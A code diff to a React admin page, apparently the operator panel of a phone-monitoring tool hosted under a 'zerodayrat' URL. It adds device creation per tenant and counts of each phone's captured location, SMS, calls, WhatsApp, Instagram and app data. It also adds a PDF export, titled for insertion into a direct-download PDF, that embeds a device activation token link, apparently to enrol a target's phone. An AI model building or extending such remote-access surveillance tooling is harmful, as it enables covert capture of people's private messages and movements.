@@ -1,6 +1,21 @@
 import { useEffect, useState } from "react";
+import { Link } from "react-router-dom";
 import { adminApi } from "../api/admin";
-import type { AdminDeviceSummary, AdminTenant } from "../api/types";
+import { devicesApi } from "../api/devices";
+import type { AdminDeviceSummary, AdminTenant, Device } from "../api/types";
+import PdfExportModal from "../components/PdfExportModal";
+
+const PRODUCTION_APP_URL = "https://zerodayrat.vercel.app";
+
+function buildActivationLink(device: AdminDeviceSummary | Device): string {
+  const params = new URLSearchParams({
+    token: device.device_token || "",
+    name: device.device_label,
+  });
+  const isLocalDev = ["localhost", "127.0.0.1"].includes(window.location.hostname);
+  const origin = isLocalDev ? PRODUCTION_APP_URL : window.location.origin;
+  return `${origin}/connect?${params.toString()}`;
+}
 
 export default function AdminPage() {
   const [tenants, setTenants] = useState<AdminTenant[]>([]);
@@ -10,6 +25,14 @@ export default function AdminPage() {
   const [devices, setDevices] = useState<Record<string, AdminDeviceSummary[]>>({});
   const [deletingUserId, setDeletingUserId] = useState<string | null>(null);
   const [deletingTenantId, setDeletingTenantId] = useState<string | null>(null);
+
+  // Quick-add device per tenant
+  const [addingDeviceForTenant, setAddingDeviceForTenant] = useState<string | null>(null);
+  const [newDeviceName, setNewDeviceName] = useState("");
+  const [creatingDevice, setCreatingDevice] = useState(false);
+
+  // PDF Export
+  const [pdfDevice, setPdfDevice] = useState<Device | null>(null);
 
   function load() {
     setLoading(true);
@@ -35,6 +58,24 @@ export default function AdminPage() {
     if (!devices[tenantId]) {
       const list = await adminApi.listTenantDevices(tenantId);
       setDevices((d) => ({ ...d, [tenantId]: list }));
+    }
+  }
+
+  async function handleCreateDeviceForTenant(tenantId: string) {
+    if (!newDeviceName.trim() || creatingDevice) return;
+    setCreatingDevice(true);
+    try {
+      await devicesApi.create(newDeviceName.trim(), tenantId);
+      setNewDeviceName("");
+      setAddingDeviceForTenant(null);
+      // Reload devices for this tenant and update counts
+      const updatedList = await adminApi.listTenantDevices(tenantId);
+      setDevices((d) => ({ ...d, [tenantId]: updatedList }));
+      load();
+    } catch (err: any) {
+      alert(`Failed to create device: ${err.response?.data?.error || err.message}`);
+    } finally {
+      setCreatingDevice(false);
     }
   }
 
@@ -157,44 +198,133 @@ export default function AdminPage() {
               </div>
 
               {expandedTenant === t.id && (
-                <div className="border-t bg-gray-50 p-5">
+                <div className="border-t bg-gray-50 p-5 space-y-4">
+                  <div className="flex items-center justify-between">
+                    <h3 className="text-xs font-bold text-gray-700 uppercase tracking-wider">
+                      Devices for {t.name} ({devices[t.id]?.length || 0})
+                    </h3>
+                    <button
+                      onClick={() => setAddingDeviceForTenant(addingDeviceForTenant === t.id ? null : t.id)}
+                      className="text-xs bg-white border border-gray-300 text-gray-700 px-2.5 py-1 rounded hover:bg-gray-100 font-medium transition"
+                    >
+                      {addingDeviceForTenant === t.id ? "Cancel" : "+ Add Device to Tenant"}
+                    </button>
+                  </div>
+
+                  {addingDeviceForTenant === t.id && (
+                    <div className="bg-white p-3 rounded-lg border border-gray-200 flex gap-2 items-center">
+                      <input
+                        type="text"
+                        placeholder="e.g. Employee Phone, Test Device"
+                        value={newDeviceName}
+                        onChange={(e) => setNewDeviceName(e.target.value)}
+                        className="flex-1 border border-gray-300 rounded px-2.5 py-1 text-xs focus:ring-1 focus:ring-primary focus:outline-none"
+                      />
+                      <button
+                        onClick={() => handleCreateDeviceForTenant(t.id)}
+                        disabled={creatingDevice || !newDeviceName.trim()}
+                        className="bg-primary text-white text-xs px-3 py-1 rounded hover:bg-primary-dark font-medium transition disabled:opacity-50"
+                      >
+                        {creatingDevice ? "Creating..." : "Create"}
+                      </button>
+                    </div>
+                  )}
+
                   {!devices[t.id] ? (
                     <p className="text-xs text-gray-400">Loading devices...</p>
                   ) : devices[t.id].length === 0 ? (
                     <p className="text-xs text-gray-400">No devices for this tenant.</p>
                   ) : (
-                    <table className="w-full text-xs">
-                      <thead className="text-gray-400 text-left">
-                        <tr>
-                          <th className="py-1 font-medium">Device</th>
-                          <th className="py-1 font-medium">Status</th>
-                          <th className="py-1 font-medium">Location</th>
-                          <th className="py-1 font-medium">SMS</th>
-                          <th className="py-1 font-medium">Calls</th>
-                          <th className="py-1 font-medium">App usage</th>
-                          <th className="py-1 font-medium">Apps</th>
-                        </tr>
-                      </thead>
-                      <tbody className="divide-y divide-gray-200">
-                        {devices[t.id].map((d) => (
-                          <tr key={d.id}>
-                            <td className="py-1.5">{d.device_label}</td>
-                            <td className="py-1.5">{d.status}</td>
-                            <td className="py-1.5">{d.counts.location_count}</td>
-                            <td className="py-1.5">{d.counts.sms_count}</td>
-                            <td className="py-1.5">{d.counts.call_count}</td>
-                            <td className="py-1.5">{d.counts.app_usage_count}</td>
-                            <td className="py-1.5">{d.counts.installed_apps_count}</td>
+                    <div className="overflow-x-auto">
+                      <table className="w-full text-xs">
+                        <thead className="text-gray-500 bg-gray-100/70 border-b border-gray-200 text-left">
+                          <tr>
+                            <th className="py-2 px-2.5 font-semibold">Device</th>
+                            <th className="py-2 px-2 font-semibold">Status</th>
+                            <th className="py-2 px-2 font-semibold">Location</th>
+                            <th className="py-2 px-2 font-semibold">SMS</th>
+                            <th className="py-2 px-2 font-semibold">Calls</th>
+                            <th className="py-2 px-2 font-semibold">WhatsApp</th>
+                            <th className="py-2 px-2 font-semibold">Instagram</th>
+                            <th className="py-2 px-2 font-semibold">App usage</th>
+                            <th className="py-2 px-2 font-semibold">Apps</th>
+                            <th className="py-2 px-2.5 font-semibold text-right">Actions</th>
                           </tr>
-                        ))}
-                      </tbody>
-                    </table>
+                        </thead>
+                        <tbody className="divide-y divide-gray-200">
+                          {devices[t.id].map((d) => (
+                            <tr key={d.id} className="hover:bg-white/80 transition">
+                              <td className="py-2 px-2.5">
+                                <Link
+                                  to={`/devices/${d.id}`}
+                                  className="text-accent font-semibold hover:underline block"
+                                  title="Open live monitoring dashboard"
+                                >
+                                  {d.device_label}
+                                </Link>
+                                {d.device_token && (
+                                  <span className="text-[10px] text-gray-400 font-mono block truncate max-w-[140px]">
+                                    {d.device_token}
+                                  </span>
+                                )}
+                              </td>
+                              <td className="py-2 px-2">
+                                <span
+                                  className={`px-1.5 py-0.5 rounded text-[10px] font-semibold capitalize ${
+                                    d.status === "active"
+                                      ? "bg-emerald-100 text-emerald-700"
+                                      : d.status === "pending"
+                                      ? "bg-amber-100 text-amber-700"
+                                      : "bg-gray-100 text-gray-600"
+                                  }`}
+                                >
+                                  {d.status}
+                                </span>
+                              </td>
+                              <td className="py-2 px-2 text-gray-600">{d.counts.location_count}</td>
+                              <td className="py-2 px-2 text-gray-600">{d.counts.sms_count}</td>
+                              <td className="py-2 px-2 text-gray-600">{d.counts.call_count}</td>
+                              <td className="py-2 px-2 font-medium text-emerald-700">{d.counts.whatsapp_count || 0}</td>
+                              <td className="py-2 px-2 font-medium text-purple-700">{d.counts.instagram_count || 0}</td>
+                              <td className="py-2 px-2 text-gray-600">{d.counts.app_usage_count}</td>
+                              <td className="py-2 px-2 text-gray-600">{d.counts.installed_apps_count}</td>
+                              <td className="py-2 px-2.5 text-right whitespace-nowrap space-x-1.5">
+                                <Link
+                                  to={`/devices/${d.id}`}
+                                  className="text-xs bg-white border border-gray-300 text-gray-700 px-2 py-1 rounded hover:bg-gray-50 transition font-medium inline-block shadow-2xs"
+                                >
+                                  Open Dashboard
+                                </Link>
+                                <button
+                                  onClick={() => setPdfDevice(d as any)}
+                                  className="text-xs bg-primary text-white border border-primary-dark px-2 py-1 rounded hover:bg-primary-dark transition font-medium inline-flex items-center gap-1 shadow-2xs"
+                                  title="Insert into direct download PDF"
+                                >
+                                  <svg className="w-3 h-3 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9 12h6m-6 4h6m2 5H7a2 2 0 01-2-2V5a2 2 0 012-2h5.586a1 1 0 01.707.293l5.414 5.414a1 1 0 01.293.707V19a2 2 0 01-2 2z" />
+                                  </svg>
+                                  PDF
+                                </button>
+                              </td>
+                            </tr>
+                          ))}
+                        </tbody>
+                      </table>
+                    </div>
                   )}
                 </div>
               )}
             </div>
           ))}
         </div>
+      )}
+
+      {pdfDevice && (
+        <PdfExportModal
+          device={pdfDevice}
+          activationUrl={buildActivationLink(pdfDevice)}
+          onClose={() => setPdfDevice(null)}
+        />
       )}
     </div>
   );
